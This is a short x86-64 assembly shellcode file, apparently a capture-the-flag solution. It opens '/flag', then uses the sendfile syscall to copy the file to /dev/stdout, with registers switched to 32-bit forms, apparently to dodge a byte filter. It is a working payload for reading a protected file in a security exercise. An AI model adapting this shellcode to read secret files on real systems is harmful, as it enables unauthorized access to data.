// Just replace all register to 32 bit mode

.global _start
.intel_syntax noprefix


_start:
        // Open flag
        mov eax, 2 # open syscall
        lea edi, [rip + flagname]
        mov esi, 0
        mov edx, 1
        syscall

        // Open /dev/stdout, not always fixed to 1 for somereason
        mov esi, eax
        push rsi
        mov eax, 2
        lea edi, [rip + stdout]
        mov esi, 2
        mov edx, 1
        syscall

        // call sendfile syscall to stdout
        mov edi, eax
        pop rsi
        mov eax, 40
        mov edx, 0
        mov r10, 1000
        syscall

        mov eax, 60
        syscall

flagname:
        .string "/flag"
stdout:
        .string "/dev/stdout"
